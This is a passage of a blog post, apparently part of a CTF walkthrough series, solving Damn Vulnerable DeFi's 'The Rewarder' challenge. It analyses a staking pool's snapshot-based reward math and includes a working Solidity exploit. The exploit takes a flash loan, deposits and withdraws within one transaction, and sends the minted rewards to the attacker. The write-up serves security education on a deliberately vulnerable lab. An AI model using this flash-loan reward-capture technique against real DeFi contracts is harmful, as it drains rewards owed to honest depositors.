+<p>Let&rsquo;s examine public/external functions of this contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> deposit(<span style="color:#fff;font-weight:bold">uint256</span> amountToDeposit) <span style="color:#fff;font-weight:bold">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (amountToDeposit == <span style="color:#ff0;font-weight:bold">0</span>) <span style="color:#fff;font-weight:bold">revert</span> MustDepositTokens();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    accToken.mint(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, amountToDeposit);
+</span></span><span style="display:flex;"><span>    distributeRewards();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (
+</span></span><span style="display:flex;"><span>        !liquidityToken.transferFrom(
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>),
+</span></span><span style="display:flex;"><span>            amountToDeposit
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    ) <span style="color:#fff;font-weight:bold">revert</span> TransferFail();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>Requires the deposit to be greater than zero.</li>
+<li>Mints an amount of rTKN&rsquo;s equal to the amount of deposited DVT&rsquo;s. These
+rTKN&rsquo;s would be burned on withdrawal.</li>
+<li>Calls the <code>distributeRewards</code>, which creates a new snapshot of
+the deposited DVT&rsquo;s for each round and distributes the rewards.</li>
+<li>Transfers the <code>amountOfDeposit</code> of DVT tokens from <code>msg.sender</code> to this contract.</li>
+</ul>
+<p>The <code>withdraw</code> function does two things:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> withdraw(<span style="color:#fff;font-weight:bold">uint256</span> amountToWithdraw) <span style="color:#fff;font-weight:bold">external</span> {
+</span></span><span style="display:flex;"><span>    accToken.burn(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, amountToWithdraw);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (!liquidityToken.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, amountToWithdraw))
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">revert</span> TransferFail();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>Burns the <code>amountToWithdraw</code> rTKN tokens.</li>
+<li>Transfers DVT tokens to the caller account.</li>
+</ul>
+<p>Now, let&rsquo;s review the most interesting function in this contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> distributeRewards() <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> rewards = <span style="color:#ff0;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (isNewRewardsRound()) {
+</span></span><span style="display:flex;"><span>        _recordSnapshot();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> totalDeposits = accToken.totalSupplyAt(
+</span></span><span style="display:flex;"><span>        lastSnapshotIdForRewards
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> amountDeposited = accToken.balanceOfAt(
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>,
+</span></span><span style="display:flex;"><span>        lastSnapshotIdForRewards
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (amountDeposited &gt; <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp; totalDeposits &gt; <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span>        rewards = (amountDeposited * <span style="color:#ff0;font-weight:bold">100</span> * <span style="color:#ff0;font-weight:bold">10</span>**<span style="color:#ff0;font-weight:bold">18</span>) / totalDeposits;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (rewards &gt; <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp; !_hasRetrievedReward(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>)) {
+</span></span><span style="display:flex;"><span>            rewardToken.mint(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, rewards);
+</span></span><span style="display:flex;"><span>            lastRewardTimestamps[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] = <span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> rewards;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It uses snapshots to calculate the rewards.
+Users get their rewards dependent on the amount deposited vs total deposits in
+the current round:</p>
+<p>\( \dfrac{amountDeposited × 100 × 10^{18}}{totalDeposits × 10^{18}} \)</p>
+<p>To get the most reward tokens in the next
+round we should deposit so many DVT&rsquo;s that the rewards for other
+users will be negligible. If we take a flash loan and deposit \(
+1000000 \) DVT&rsquo;s then our share will be so big that other users
+will get \( 0 \) RWT&rsquo;s due to integer deivision rounding.</p>
+<p>We can calculate the amount of reward tokens we&rsquo;ll get:</p>
+<p>\( \dfrac{1000000 × 100 × 10^{18}}{(1000000 + 400) × 10^{18}} =
+\dfrac{100000000}{1000400} ≈ 99.96 \)</p>
+<p>Now let&rsquo;s calculate the amount of RWT&rsquo;s for each user who deposited \(
+100 \) DVT&rsquo;s:</p>
+<p>\( \dfrac{100 × 100 × 10^{18}}{(1000000 + 400) × 10^{18}} =
+\dfrac{10000}{1000400} = 0 \) (because of integer division)</p>
+<h2 id="solution">
+  Solution
+  <a class="heading-link" href="#solution">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>The <code>deposit</code> function immediately distributes the rewards.
+Hence we have to get ahead of everyone and be the first with our
+deposit. The <code>distributeRewards</code> uses the snapshot to get the
+<code>totalDeposits</code> so we can withdraw the deposited DVT&rsquo;s right away.
+Then we pay back the flash loan and transfer all the rewards to the
+<code>owner</code> (attacker):</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Exploit <span style="color:#fff;font-weight:bold">is</span> DSTest {
+</span></span><span style="display:flex;"><span>    TheRewarderPool <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> rewarder;
+</span></span><span style="display:flex;"><span>    FlashLoanerPool <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> flashLoaner;
+</span></span><span style="display:flex;"><span>    DamnValuableToken <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> dvt;
+</span></span><span style="display:flex;"><span>    RewardToken <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> rwt;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">immutable</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(TheRewarderPool _rewarder, FlashLoanerPool _flashLoaner) {
+</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
+</span></span><span style="display:flex;"><span>        rewarder = _rewarder;
+</span></span><span style="display:flex;"><span>        flashLoaner = _flashLoaner;
+</span></span><span style="display:flex;"><span>        dvt = _rewarder.liquidityToken();
+</span></span><span style="display:flex;"><span>        rwt = _rewarder.rewardToken();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> poolBalance = dvt.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(flashLoaner));
+</span></span><span style="display:flex;"><span>        flashLoaner.flashLoan(poolBalance);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> receiveFlashLoan(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> {
+</span></span><span style="display:flex;"><span>        dvt.approve(<span style="color:#fff;font-weight:bold">address</span>(rewarder), amount);
+</span></span><span style="display:flex;"><span>        rewarder.deposit(amount);
+</span></span><span style="display:flex;"><span>        rewarder.withdraw(amount);
+</span></span><span style="display:flex;"><span>        dvt.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">address</span>(flashLoaner), amount);
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> rewardBalance = rwt.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
+</span></span><span style="display:flex;"><span>        rwt.<span style="color:#fff;font-weight:bold">transfer</span>(owner, rewardBalance);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We can use the <a href="https://book.getfoundry.sh/cheatcodes/warp?highlight=vm.warp#examples">vm.warp</a>
+to set the <code>block.timestamp</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// wait for the next round
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    vm.warp(<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span> + <span style="color:#ff0;font-weight:bold">5</span> <span style="color:#fff;font-weight:bold">days</span>);
+</span></span><span style="display:flex;"><span>    vm.startPrank(attacker);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">new</span> Exploit(theRewarderPool, flashLoanerPool).run();
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
+</span></span><span style="display:flex;"><span>    validation();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And we passed the challenge! The trace is to large, so I&rsquo;ll skip
+it this time %) Maybe
+<a href="https://gist.github.com/vyorkin/89b3d301e49990041a933068034fc7e6">this
+sequence diagram</a> can help visualizing the interactions between
+contracts.</p>
+<h2 id="references">
+  References
+  <a class="heading-link" href="#references">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<ul>
+<li><a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot">ERC20Snapshot</a></li>
+<li><a href="https://docs.openzeppelin.com/contracts/3.x/api/access#AccessControl">AccessControl</a></li>
+<li><a href="https://solidity-by-example.org/defi/staking-rewards/">Staking
+Rewards</a> &ndash; A minimal example of a contract that rewards
+users for staking their token from <a href="https://solidity-by-example.org/">Solidity by Example</a>.</li>
+</ul>
+<hr>
+<p>The solution/exploit code is <a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/the-rewarder/TheRewarder.t.sol#L15-L44">here</a>.
+This one was a bit trickier! Let&rsquo;s see whats next &ndash;
+<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-6-selfie">#6 Selfie</a>.</p>
+
+        
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"
+    integrity="sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js"
+    integrity="sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js"
+    integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      1985 -
+    
+    2022
+     Vasiliy Yorkin 
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+  
+  <script src="https://vyorkin.org/js/coder.min.b9a9a8f029e2fd416957bf8489db1b684799393553df358655a1b614ec7c5ef9.js" integrity="sha256-uamo8Cni/UFpV7&#43;EidsbaEeZOTVT3zWGVaG2FOx8Xvk="></script>
+  
+
+  
+
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-F8R77TYF8B', { 'anonymize_ip': false });
+}
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
